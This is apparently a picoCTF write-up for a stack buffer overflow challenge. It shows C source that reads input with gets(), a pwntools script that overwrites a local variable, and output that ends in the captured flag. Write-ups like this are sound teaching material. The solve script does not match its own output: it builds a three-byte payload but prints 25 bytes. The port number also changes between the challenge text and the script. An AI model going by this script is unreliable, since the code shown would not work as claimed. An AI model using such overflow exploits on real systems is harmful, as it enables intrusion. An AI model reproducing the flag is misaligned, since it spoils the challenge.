Smash the stack
Can you overflow the buffer and modify the other local variable? The program is available here. You can view source here. And connect with it using:
`nc saturn.picoctf.net 52915`

Lets examine the source file. 

Source: 
```c
#include <stdio.h>
#include <stdlib.h>

int main(){
  FILE *fptr;
  char c;

  char input[16];
  int num = 64;
  
  printf("Enter a string: ");
  fflush(stdout);
  gets(input);
  printf("\n");
  
  printf("num is %d\n", num);
  fflush(stdout);
  
  if( num == 65 ){
    printf("You win!\n");
    fflush(stdout);
    // Open file
    fptr = fopen("flag.txt", "r");
    if (fptr == NULL)
    {
        printf("Cannot open file.\n");
        fflush(stdout);
        exit(0);
    }
    // Read contents from file
    c = fgetc(fptr);
    while (c != EOF)
    {
        printf ("%c", c);
        c = fgetc(fptr);
    }
    fflush(stdout);
    printf("\n");
    fflush(stdout);
    fclose(fptr);
    exit(0);
  }
  printf("Bye!\n");
  fflush(stdout);
}
```

We can clearly see the vulnerability `gets`. We can use buffer overflow to modify the variable `num`





Solve script: 
```python
from pwn import * 

p = remote('saturn.picoctf.net', 58903)

payload = b'A'*2
payload += b'A'  # chr(0x41) 

p.sendline(payload)

response = p.recvline()
print(f"{response.decode().strip()}")

print(payload)

p.interactive()
```

Output: 
```
[+] Opening connection to saturn.picoctf.net on port 58903: Done
Enter a string:
b'AAAAAAAAAAAAAAAAAAAAAAAAA'
[*] Switching to interactive mode
num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_7bd3fee1}
[*] Got EOF while reading in interactive
```